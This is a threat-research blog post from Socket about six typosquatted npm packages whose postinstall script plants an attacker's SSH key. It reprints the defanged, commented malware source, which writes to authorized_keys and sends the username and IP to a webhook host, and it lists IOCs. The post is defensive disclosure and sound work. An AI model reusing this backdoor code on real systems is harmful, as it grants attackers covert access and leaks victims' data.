---
title: "Malicious npm Packages Inject SSH Backdoors via Typosquatted Libraries"
short_title: "Malicious npm Packages Inject SSH Backdoors via Typosquats"
date: 2024-11-22 12:00:00 +0000
categories: [npm]
tags: [npm, JavaScript, Typosquatting, Backdoor, T1195.002, T1036.005, T1059.007, T1021.004, T1190, T1005, T1567.004]
canonical_url: https://socket.dev/blog/malicious-npm-packages-inject-ssh-backdoors-via-typosquatted-libraries
source: Socket
image:
  path: https://cdn.sanity.io/images/cgdhsj6q/production/cd5004ed1822afaf64bc3085be7a1fa104740fb0-1024x1024.webp
  alt: "Malicious npm Packages Inject SSH Backdoors via Typosquatted Libraries"
description: "Socket's threat research team has detected six malicious npm packages typosquatting popular libraries to insert SSH backdoors."
---

Socket's threat research team has detected six malicious npm packages published by a threat actor "sanchezjosephine180" who designed them to mimic highly popular libraries through typosquatting. The threat actor targeted libraries `babel-cli`, `chokidar`, `streamsearch`, `ssh2`, `npm-run-all`, and `node-pty`, which have tens of millions of downloads and are integral to the developer community.

The malicious packages [`babelcl`](https://socket.dev/npm/package/babelcl/overview/0.0.6), [`chokader`](https://socket.dev/npm/package/chokader/overview/0.0.6), [`streamserch`](https://socket.dev/npm/package/streamserch/overview/0.0.6), [`sss2h`](https://socket.dev/npm/package/sss2h/overview/0.0.6), [`npmrunnall`](https://socket.dev/npm/package/npmrunnall/overview/0.0.6), and [`node-pyt`](https://socket.dev/npm/package/node-pyt/overview/0.0.6) pose a significant risk by injecting a backdoor into Linux systems, granting the threat actor unauthorized SSH access. At the time of writing, these malicious packages are live on the npm registry and have been downloaded over 700 times. We petitioned the npm registry to remove them.

![Socket AI Scanner detected typosquatted and malicious streamserch package](https://cdn.sanity.io/images/cgdhsj6q/production/5aac95a90bb7cd7bcc719e10656d1bdc05b5f61a-1431x550.png)
_Socket AI Scanner detected typosquatted and malicious "streamserch" package_

The threat actor exploits common typing errors and abuses the `postinstall` script to distribute malicious code aimed to compromise developers and organizations. The `postinstall` script is automatically executed after the package is installed. It runs `node app.js` followed by a legitimate package installation, e.g. `npm install streamsearch`. The latter installs the legitimate `streamsearch` package to provide expected functionality, reducing the chance of immediate detection.

## The Impact

Unauthorized and unmonitored SSH access to a system or network is like a secret gate hidden within a fortified castle's walls. Attackers can slip inside undetected, bypass security measures, move throughout, gather intelligence, and potentially compromise the entire network. SSH access credentials are actively traded on the dark web, where threat actors buy and sell them to launch cyberattacks and commit fraud. Security researchers have documented attackers using SSH access for espionage, illegal cryptocurrency mining, and as a gateway for [ransomware](https://www.bitdefender.com/en-us/blog/businessinsights/cactus-analyzing-a-coordinated-ransomware-attack-on-corporate-networks) attacks. A network of brokers and dark web marketplaces exists solely to trade these access points. An unauthorized SSH key does not just open a door — it creates a hidden pathway for attackers to infiltrate and threaten the very foundation of the organization's digital fortress.

![Threat actor selling SSH access on the underground forum Exploit](https://cdn.sanity.io/images/cgdhsj6q/production/f5a0b74a2583a74ea317d784bf36a81a33349c4d-1839x525.png)
_Threat actor is selling an SSH access on the underground forum Exploit_

![Dark web shop dedicated to selling SSH accesses](https://cdn.sanity.io/images/cgdhsj6q/production/ed3f2c9662e1b237d00b8fed51813cd78f3ebd7c-1349x876.png)
_Dark web shop dedicated to selling SSH accesses_

## SSH Backdoor Code

[The script in the malicious packages](https://socket.dev/npm/package/sss2h/files/0.0.6/app.js#L1) lets the threat actor access the victim's system via SSH, exposes sensitive information like the username and IP address, and establishes a foothold for further malicious activities. Below is the threat actor's code, defanged, and with added comments highlighting malicious functionality and intent.

```javascript
const fs = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');

// Retrieve the current user's username
const username = os.userInfo().username;

// Function to get the public IP address of the machine
function getPublicIP() {
    return new Promise((resolve, reject) => {
        // Obtain the public IP
        https.get('https://ipinfo[.]io/ip', (res) => {
            let data = '';
            res.on('data', chunk => {
                data += chunk;
            });
            res.on('end', () => {
                resolve(data.trim());
            });
        }).on('error', (err) => {
            reject(err);
        });
    });
}

// Hardcoded SSH public key controlled by the attacker
const publicKey = `ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCnTfldNjDJjIdEBrURW+h07EesyNTJiaHl0LOGroC8WSlDPQNa1koRHmcVUdmEbdmiomsS/PTtLiJsANMIS9PDK5z1F6BQL0ZqcrWowD7IwQ3+aoxdVpUK2z+S5/guppkzbfCoWQ65XOAjdt1AQf4MTEaW6uewLM35aHinM860c3TwkDvH1WTG2HxpPV1zgDmVKPyG6o+BRAhBsoJOeGXvDZt7MP42P8lAr2eTaDLNQV2oK5jmIHCgk3aW5G5zDv1eCucb2qg6YKgeIedb89VBQrWhl9PNyrwdCcMrH/PEcRsR8xt+RHeBiHtmNvhJ4pYOrdQi4NzHTtiLeqcr8IXB`;

// Asynchronous function to add the attacker's SSH key to the user's authorized_keys file
async function addSSHKey() {

    // Check if the operating system is Linux
    if (os.platform() === 'linux') {
        try {
            const ipAddress = await getPublicIP();

            // Construct the full public key with username and IP address for identification
            const fullPublicKey = `${publicKey} ${username}@${ipAddress}`;

            const sshDir = path.join(os.homedir(), '.ssh');
            const authorizedKeysPath = path.join(sshDir, 'authorized_keys');

            // Check if the .ssh directory exists; if not, create it with appropriate permissions
            if (!fs.existsSync(sshDir)) {
                fs.mkdirSync(sshDir, { mode: 0o700 });
            }

            // If the authorized_keys file exists, append the attacker's public key
            if (fs.existsSync(authorizedKeysPath)) {
                fs.appendFileSync(authorizedKeysPath, `\n${fullPublicKey}\n`);
                console.log(''); // Empty console log to avoid drawing attention
            } else {
                // If it doesn't exist, create the file and write the attacker's key with secure permissions
                fs.writeFileSync(authorizedKeysPath, `${fullPublicKey}\n`, { mode: 0o600 });
                console.log(''); // Empty console log
            }

            // Send a notification to the attacker's server with the IP address and username
            https.get(`https://webhook-test[.]com/8caf20007640ce1a4d2843af7b479eb1?data=I:${ipAddress}&M:${username}`, (res1) => {
                res1.on('data', () => { })
                res1.on('end', () => {
                    console.log('Installation complete.');
                });
            }).on('error', (e) => {
                console.error(``); // Suppress error messages to avoid suspicion
            });
        } catch (err) {
            console.error('', err); // Suppress error messages
        }
    } else {
        console.log(''); // If not Linux, do nothing (silent failure)
    }
}

// Invoke the function to execute the malicious actions
addSSHKey();
```

The malicious script adds the threat actor's SSH public key to the user's `authorized_keys` file, grants unauthorized access, and performs data exfiltration by sending the victim's username and public IP address to a remote server. It operates silently to avoid detection, executing upon installation of the package.

![Socket AI Scanner description for the malicious sss2h package](https://cdn.sanity.io/images/cgdhsj6q/production/7a5ef5176b65d2b844b6a498a84bee5d496ab1c7-620x535.png)
_Socket AI Scanner's description with additional context for the malicious "sss2h" package_

## Command and Control (C2)

By receiving the username and IP address, the threat actor is alerted that the malicious script executed successfully on a victim's machine. The collected information allows the threat actor to identify the compromised system and establish an SSH connection using the injected key. Using a standard HTTPS request to a seemingly benign domain ([webhook-test.com](http://webhook-test.com)) helps the threat actor evade basic network security measures that might flag unusual or suspicious connections. [Webhook-test.com](http://Webhook-test.com) is a service that allows users to create unique URLs (endpoints) to receive HTTP/S requests, typically used for testing and debugging webhooks. Such services are designed to capture and display incoming requests for developers to inspect. In this case, the threat actor likely chose this service to collect victim data without directly exposing their own servers or IP addresses, making it harder to trace the activity back to them.

## The Seventh Package

The six npm packages published by the threat actor all contain identical malicious code. There is also a seventh package, `parimiko`, which closely resembles `paramiko`, a well-known Python library for SSH communication. The threat actor aims to exploit typographical errors made by users searching for or installing the legitimate package, and developers working with multiple programming languages who may accidentally install the npm package `parimiko` instead of the Python package `paramiko`.

The `parimiko` package shares the same structure as other packages from this threat actor but currently lacks malicious code. By publishing a benign package, the threat actor may try to build a facade of legitimacy, making it easier to distribute malicious code in the future. The `parimiko` package may be benign now but could be updated later with malicious code once it has a significant number of installations. Users who incorporate `parimiko` into their projects without strict version control could automatically receive these malicious updates.

## Outlook and Conclusions

The discovery of these malicious npm packages highlights critical vulnerabilities in software supply chains. For individual developers, the risks are immediate — unauthorized access to their machines, exposure of sensitive data, and potential corruption of their development projects. For organizations, the stakes are even higher, as attackers can introduce vulnerabilities into production environments, steal proprietary code, and gain footholds in internal networks.

As open source ecosystems grow, so does the attack surface, giving threat actors more opportunities to infiltrate malicious code. The discovery of SSH backdoors in typosquatted packages emphasizes the urgent need for stronger security practices among developers and organizations. Attackers will continue refining their tactics, exploiting trust and human error through techniques like typosquatting. The developer community must adopt proactive security measures, stay informed about emerging threats, and cultivate a culture of vigilance in managing software supply chains.

## Protect Yourself and Your Organization with Socket's Free Tools

Protecting against supply chain attacks requires robust security tools in your development workflow. Socket offers free tools that detect and prevent these threats in real time. The [Socket GitHub app](https://socket.dev/features/github) serves as a critical line of defense by scanning dependencies in every pull request. When it detects a potentially malicious or typosquatted package, it immediately alerts developers, allowing them to take action before harmful code enters their project.

The [Socket CLI tool](https://socket.dev/features/cli) provides additional protection during development by safeguarding your machine from malicious packages during npm installations. It wraps npm commands and analyzes all dependencies, including deeply nested ones, before installation. If it identifies a risky package, you will receive an alert before any code writes to disk, letting you choose whether to halt or proceed with installation.

Adding Socket's tools to your workflow is straightforward and free. These solutions help shield your projects and organization from the devastating impact of supply chain attacks. Remember: always double-check package names, review third-party code thoroughly, and use Socket's security tools to detect and prevent threats.

### MITRE ATT&CK

- T1195.002 — Supply Chain Compromise: Compromise Software Supply Chain
- T1036.005 — Masquerading: Match Legitimate Name or Location
- T1059.007 — Command and Scripting Interpreter: JavaScript
- T1021.004 — Remote Services: SSH
- T1190 — Exploit Public-Facing Application
- T1005 — Data from Local System
- T1567.004 — Exfiltration Over Web Service: Exfiltration Over Webhook

## Indicators of Compromise (IOCs)

### Malicious Packages

- parimiko
- streamserch
- sss2h
- babelcl
- npmrunnall
- node-pyt
- chokader

### Hardcoded SSH Public Key

- `AAAAB3NzaC1yc2EAAAADAQABAAABAQCnTfldNjDJjIdEBrURW+h07EesyNTJiaHl0LOGroC8WSlDPQNa1koRHmcVUdmEbdmiomsS/PTtLiJsANMIS9PDK5z1F6BQL0ZqcrWowD7IwQ3+aoxdVpUK2z+S5/guppkzbfCoWQ65XOAjdt1AQf4MTEaW6uewLM35aHinM860c3TwkDvH1WTG2HxpPV1zgDmVKPyG6o+BRAhBsoJOeGXvDZt7MP42P8lAr2eTaDLNQV2oK5jmIHCgk3aW5G5zDv1eCucb2qg6YKgeIedb89VBQrWhl9PNyrwdCcMrH/PEcRsR8xt+RHeBiHtmNvhJ4pYOrdQi4NzHTtiLeqcr8IXB`

### C2

- `https://webhook-test[.]com/8caf20007640ce1a4d2843af7b479eb1`
